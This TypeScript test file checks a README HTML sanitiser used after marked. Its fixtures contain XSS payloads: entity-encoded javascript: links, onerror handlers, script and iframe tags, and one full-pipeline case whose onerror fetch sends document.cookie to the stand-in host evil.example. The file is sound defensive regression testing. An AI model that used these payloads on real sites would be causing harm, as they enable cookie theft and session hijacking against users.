import assert from "node:assert/strict";
import test from "node:test";
import { marked } from "marked";
import {
  sanitizeReadmeHtml,
// @ts-expect-error Node built-in runner
} from "./sanitize-readme-html.ts";

marked.setOptions({ gfm: true, breaks: true });

// ─────────────────────────────────────────────────────────────
// Security regression tests
// ─────────────────────────────────────────────────────────────

test("removes an entity-encoded javascript: URI in an href", () => {
  const malicious = '<a href="&#106;avascript:alert(1)">click me</a>';
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/javascript:/i.test(output), false, `expected no javascript: scheme in: ${output}`);
});

test("removes a literal javascript: URI in an href", () => {
  const malicious = '<a href="javascript:alert(1)">click me</a>';
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/javascript:/i.test(output), false, `expected no javascript: scheme in: ${output}`);
});

test("strips onerror while keeping a safe image", () => {
  const malicious = '<img src="https://example.com/badge.svg" onerror="alert(1)">';
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/onerror/i.test(output), false, `expected onerror removed: ${output}`);
  assert.ok(output.includes("https://example.com/badge.svg"), `expected image src preserved: ${output}`);
});

test("removes script tags entirely, no executable script markup survives", () => {
  const malicious = "<script>alert(1)</script><p>hello</p>";
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/<script/i.test(output), false, `expected no script tag: ${output}`);
  assert.ok(output.includes("hello"));
});

test("removes vbscript: URIs", () => {
  const malicious = '<a href="vbscript:msgbox(1)">click</a>';
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/vbscript:/i.test(output), false, `expected no vbscript: scheme in: ${output}`);
});

test("removes iframe/object/embed tags", () => {
  const malicious = '<iframe src="https://evil.example"></iframe><object data="x"></object><embed src="y">';
  const output = sanitizeReadmeHtml(malicious);
  assert.equal(/<iframe|<object|<embed/i.test(output), false, `expected no executable embeds: ${output}`);
});

test("preserves a legitimate https link", () => {
  const html = '<a href="https://github.com/hiroqt/ratefactor">RateFactor</a>';
  const output = sanitizeReadmeHtml(html);
  assert.ok(output.includes('href="https://github.com/hiroqt/ratefactor"'));
  assert.ok(output.includes("RateFactor"));
});

test("preserves a legitimate badge image", () => {
  const html = '<img src="https://img.shields.io/badge/build-passing-green" alt="build badge">';
  const output = sanitizeReadmeHtml(html);
  assert.ok(output.includes("https://img.shields.io/badge/build-passing-green"));
  assert.ok(output.includes('alt="build badge"'));
});

test("preserves a GFM table", () => {
  const html = "<table><thead><tr><th>Name</th><th>Version</th></tr></thead><tbody><tr><td>marked</td><td>18</td></tr></tbody></table>";
  const output = sanitizeReadmeHtml(html);
  assert.ok(output.includes("<table"));
  assert.ok(output.includes("<th"));
  assert.ok(output.includes("marked"));
});

test("does not destroy ordinary README content", () => {
  const html = "<h1>Title</h1><p>Some <strong>bold</strong> text and <code>inline code</code>.</p><ul><li>one</li><li>two</li></ul><blockquote>quoted</blockquote><pre><code>const x = 1;</code></pre>";
  const output = sanitizeReadmeHtml(html);
  assert.ok(output.includes("<h1>Title</h1>"));
  assert.ok(output.includes("<strong>bold</strong>"));
  assert.ok(output.includes("<code>inline code</code>"));
  assert.ok(output.includes("<li>one</li>"));
  assert.ok(output.includes("<blockquote>"));
  assert.ok(output.includes("<pre>"));
});

// ─────────────────────────────────────────────────────────────
// Full pipeline: Markdown -> marked.parse -> sanitizeReadmeHtml
// ─────────────────────────────────────────────────────────────

test("full pipeline: raw HTML embedded in markdown source is neutralized only after parsing", () => {
  // marked passes inline raw HTML straight through untouched; a pre-parse
  // regex over the *markdown* source would need to already understand HTML
  // to catch this. The sanitizer must run on marked's output, not the input.
  const markdown = [
    "# My Project",
    "",
    "Check this out: <img src=x onerror=\"fetch('https://evil.example/steal?c='+document.cookie)\">",
    "",
    "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(document.cookie)\">legit-looking link</a>",
  ].join("\n");

  const rawHtml = marked.parse(markdown) as string;
  // Sanity check: marked really did pass the dangerous markup through untouched.
  assert.ok(/onerror/i.test(rawHtml), "expected marked to pass raw HTML through unchanged");

  const output = sanitizeReadmeHtml(rawHtml);
  assert.equal(/onerror/i.test(output), false, `expected onerror stripped from final HTML: ${output}`);
  assert.equal(/javascript:/i.test(output), false, `expected javascript: scheme stripped: ${output}`);
  assert.ok(output.includes("<h1>My Project</h1>"));
});

test("full pipeline: normal GFM readme content survives", () => {
  const markdown = [
    "# RateFactor",
    "",
    "[![build](https://img.shields.io/badge/build-passing-green)](https://github.com/hiroqt/ratefactor)",
    "",
    "## Features",
    "- fast",
    "- simple",
    "",
    "| Name | Version |",
    "| --- | --- |",
    "| marked | 18 |",
    "",
    "```js",
    "console.log('hi')",
    "```",
  ].join("\n");

  const rawHtml = marked.parse(markdown) as string;
  const output = sanitizeReadmeHtml(rawHtml);

  assert.ok(output.includes("<h1>RateFactor</h1>"));
  assert.ok(output.includes("https://img.shields.io/badge/build-passing-green"));
  assert.ok(output.includes("https://github.com/hiroqt/ratefactor"));
  assert.ok(output.includes("<table"));
  assert.ok(output.includes("marked"));
  assert.ok(output.includes("console.log"));
});
